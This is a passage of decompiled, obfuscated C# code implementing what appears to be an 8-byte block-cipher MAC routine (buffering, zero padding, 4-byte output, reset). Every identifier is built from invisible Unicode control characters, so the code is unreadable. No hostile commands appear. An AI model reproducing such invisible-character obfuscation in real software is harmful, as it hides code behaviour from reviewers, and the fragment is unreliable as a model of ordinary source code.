        destinationArray = \u206F‪⁪⁭‪⁫‪⁬‌‮⁮‪‎⁯‪⁭‪‪‬​⁬‎​⁪‪⁮⁪‭⁪‬‫‭‏⁯⁫‭‫⁭‍‌‮.\u202D‍⁪⁮‪‍⁪​‍⁬⁮‬⁬⁭‍⁮⁫⁯‫⁫​‎‬⁭⁬⁫⁪⁪‪⁬‎⁯⁭‭⁯‫⁬‫‎‌‮(this.\u202C‮⁬​‪⁯⁬‍‭‏⁯‮‬‭‍‪‫‌‌​‌⁪‬⁯⁮​‮‌‍​⁯​‍‌‭⁯⁮⁭⁬⁭‮, 0, this.\u206C⁬‎⁭⁭⁮⁬‎⁮⁬‮​⁬‫‬‏⁬⁬⁮⁭‪⁪⁮‬⁬‬‪​‌‪⁯​⁯⁮​‍‬‏‎‍‮);
      this.\u206A‏‌‍⁬‌‏‭⁯‮‭‎​‍⁪⁪​⁮​⁬‪‭⁯‮‮⁭‭⁭‫‪‎‎⁮‌⁭⁭⁮⁪⁬‌‮(this.\u200C​⁬⁭‏⁫‬⁮‍‍​⁯‬‪‪‏‫​⁯‌⁭‭‬‎‮‮​‭‬‍​‏⁭‬‏‎⁪​⁭⁮‮, destinationArray, 0, this.\u206C⁬‎⁭⁭⁮⁬‎⁮⁬‮​⁬‫‬‏⁬⁬⁮⁭‪⁪⁮‬⁬‬‪​‌‪⁯​⁯⁮​‍‬‏‎‍‮, 0);
      this.\u206D‎​‮‭‭⁭‬​‭⁪‫⁯‏⁬⁪⁪⁪⁮‌⁬⁪‭‏⁫⁭​‪‎‭‫⁮⁮‬‏⁭‎⁮⁮‬‮ = 0;
      _param3 -= length;
      _param2 += length;
      while (_param3 > 8)
      {
        this.\u206A‏‌‍⁬‌‏‭⁯‮‭‎​‍⁪⁪​⁮​⁬‪‭⁯‮‮⁭‭⁭‫‪‎‎⁮‌⁭⁭⁮⁪⁬‌‮(this.\u200C​⁬⁭‏⁫‬⁮‍‍​⁯‬‪‪‏‫​⁯‌⁭‭‬‎‮‮​‭‬‍​‏⁭‬‏‎⁪​⁭⁮‮, \u206F‪⁪⁭‪⁫‪⁬‌‮⁮‪‎⁯‪⁭‪‪‬​⁬‎​⁪‪⁮⁪‭⁪‬‫‭‏⁯⁫‭‫⁭‍‌‮.\u202D‍⁪⁮‪‍⁪​‍⁬⁮‬⁬⁭‍⁮⁫⁯‫⁫​‎‬⁭⁬⁫⁪⁪‪⁬‎⁯⁭‭⁯‫⁬‫‎‌‮(_param1, _param2, this.\u206C⁬‎⁭⁭⁮⁬‎⁮⁬‮​⁬‫‬‏⁬⁬⁮⁭‪⁪⁮‬⁬‬‪​‌‪⁯​⁯⁮​‍‬‏‎‍‮), 0, this.\u206C⁬‎⁭⁭⁮⁬‎⁮⁬‮​⁬‫‬‏⁬⁬⁮⁭‪⁪⁮‬⁬‬‪​‌‪⁯​⁯⁮​‍‬‏‎‍‮, 0);
        _param3 -= 8;
        _param2 += 8;
      }
    }
    Array.Copy((Array) _param1, _param2, (Array) this.\u202C‮⁬​‪⁯⁬‍‭‏⁯‮‬‭‍‪‫‌‌​‌⁪‬⁯⁮​‮‌‍​⁯​‍‌‭⁯⁮⁭⁬⁭‮, this.\u206D‎​‮‭‭⁭‬​‭⁪‫⁯‏⁬⁪⁪⁪⁮‌⁬⁪‭‏⁫⁭​‪‎‭‫⁮⁮‬‏⁭‎⁮⁮‬‮, _param3);
    this.\u206D‎​‮‭‭⁭‬​‭⁪‫⁯‏⁬⁪⁪⁪⁮‌⁬⁪‭‏⁫⁭​‪‎‭‫⁮⁮‬‏⁭‎⁮⁮‬‮ += _param3;
  }

  public int \u200F‏‏‬‫​⁮‬⁫‌‌⁮⁬‏⁭‭‌⁯⁪​‍​⁮⁫‮‫⁮‌‎‪⁬⁯⁪‪⁬‫⁫⁮‪⁭‮(byte[] _param1, int _param2)
  {
    while (this.\u206D‎​‮‭‭⁭‬​‭⁪‫⁯‏⁬⁪⁪⁪⁮‌⁬⁪‭‏⁫⁭​‪‎‭‫⁮⁮‬‏⁭‎⁮⁮‬‮ < 8)
      this.\u202C‮⁬​‪⁯⁬‍‭‏⁯‮‬‭‍‪‫‌‌​‌⁪‬⁯⁮​‮‌‍​⁯​‍‌‭⁯⁮⁭⁬⁭‮[this.\u206D‎​‮‭‭⁭‬​‭⁪‫⁯‏⁬⁪⁪⁪⁮‌⁬⁪‭‏⁫⁭​‪‎‭‫⁮⁮‬‏⁭‎⁮⁮‬‮++] = (byte) 0;
    byte[] destinationArray = new byte[this.\u202C‮⁬​‪⁯⁬‍‭‏⁯‮‬‭‍‪‫‌‌​‌⁪‬⁯⁮​‮‌‍​⁯​‍‌‭⁯⁮⁭⁬⁭‮.Length];
    Array.Copy((Array) this.\u202C‮⁬​‪⁯⁬‍‭‏⁯‮‬‭‍‪‫‌‌​‌⁪‬⁯⁮​‮‌‍​⁯​‍‌‭⁯⁮⁭⁬⁭‮, 0, (Array) destinationArray, 0, this.\u206C⁬‎⁭⁭⁮⁬‎⁮⁬‮​⁬‫‬‏⁬⁬⁮⁭‪⁪⁮‬⁬‬‪​‌‪⁯​⁯⁮​‍‬‏‎‍‮.Length);
    if (this.\u200D⁫‮‏⁮‮‎⁪‍‭‏‍⁬‌⁮⁬‎‪‬‮⁫‬⁫‌‬‭‪⁮‍‏⁫‍⁮​‫⁪⁯‪⁫⁯‮)
      this.\u200D⁫‮‏⁮‮‎⁪‍‭‏‍⁬‌⁮⁬‎‪‬‮⁫‬⁫‌‬‭‪⁮‍‏⁫‍⁮​‫⁪⁯‪⁫⁯‮ = false;
    else
      destinationArray = \u206F‪⁪⁭‪⁫‪⁬‌‮⁮‪‎⁯‪⁭‪‪‬​⁬‎​⁪‪⁮⁪‭⁪‬‫‭‏⁯⁫‭‫⁭‍‌‮.\u202D‍⁪⁮‪‍⁪​‍⁬⁮‬⁬⁭‍⁮⁫⁯‫⁫​‎‬⁭⁬⁫⁪⁪‪⁬‎⁯⁭‭⁯‫⁬‫‎‌‮(this.\u202C‮⁬​‪⁯⁬‍‭‏⁯‮‬‭‍‪‫‌‌​‌⁪‬⁯⁮​‮‌‍​⁯​‍‌‭⁯⁮⁭⁬⁭‮, 0, this.\u206C⁬‎⁭⁭⁮⁬‎⁮⁬‮​⁬‫‬‏⁬⁬⁮⁭‪⁪⁮‬⁬‬‪​‌‪⁯​⁯⁮​‍‬‏‎‍‮);
    this.\u206A‏‌‍⁬‌‏‭⁯‮‭‎​‍⁪⁪​⁮​⁬‪‭⁯‮‮⁭‭⁭‫‪‎‎⁮‌⁭⁭⁮⁪⁬‌‮(this.\u200C​⁬⁭‏⁫‬⁮‍‍​⁯‬‪‪‏‫​⁯‌⁭‭‬‎‮‮​‭‬‍​‏⁭‬‏‎⁪​⁭⁮‮, destinationArray, 0, this.\u206C⁬‎⁭⁭⁮⁬‎⁮⁬‮​⁬‫‬‏⁬⁬⁮⁭‪⁪⁮‬⁬‬‪​‌‪⁯​⁯⁮​‍‬‏‎‍‮, 0);
    Array.Copy((Array) this.\u206C⁬‎⁭⁭⁮⁬‎⁮⁬‮​⁬‫‬‏⁬⁬⁮⁭‪⁪⁮‬⁬‬‪​‌‪⁯​⁯⁮​‍‬‏‎‍‮, this.\u206C⁬‎⁭⁭⁮⁬‎⁮⁬‮​⁬‫‬‏⁬⁬⁮⁭‪⁪⁮‬⁬‬‪​‌‪⁯​⁯⁮​‍‬‏‎‍‮.Length / 2 - 4, (Array) _param1, _param2, 4);
    this.\u202C‬‎⁪​​‌‎‍⁯⁯​‮‪‮​⁭‬‭​⁮‬‍⁬⁬⁫‭​‎‌⁪⁬‬‮⁬⁫‮⁮‪‪‮();
    return 4;
  }

  public void \u202C‬‎⁪​​‌‎‍⁯⁯​‮‪‮​⁭‬‭​⁮‬‍⁬⁬⁫‭​‎‌⁪⁬‬‮⁬⁫‮⁮‪‪‮()
  {
    Array.Clear((Array) this.\u202C‮⁬​‪⁯⁬‍‭‏⁯‮‬‭‍‪‫‌‌​‌⁪‬⁯⁮​‮‌‍​⁯​‍‌‭⁯⁮⁭⁬⁭‮, 0, this.\u202C‮⁬​‪⁯⁬‍‭‏⁯‮‬‭‍‪‫‌‌​‌⁪‬⁯⁮​‮‌‍​⁯​‍‌‭⁯⁮⁭⁬⁭‮.Length);
    this.\u206D‎​‮‭‭⁭‬​‭⁪‫⁯‏⁬⁪⁪⁪⁮‌⁬⁪‭‏⁫⁭​‪‎‭‫⁮⁮‬‏⁭‎⁮⁮‬‮ = 0;
    this.\u200D⁫‮‏⁮‮‎⁪‍‭‏‍⁬‌⁮⁬‎‪‬‮⁫‬⁫‌‬‭‪⁮‍‏⁫‍⁮​‫⁪⁯‪⁫⁯‮ = true;
  }
}
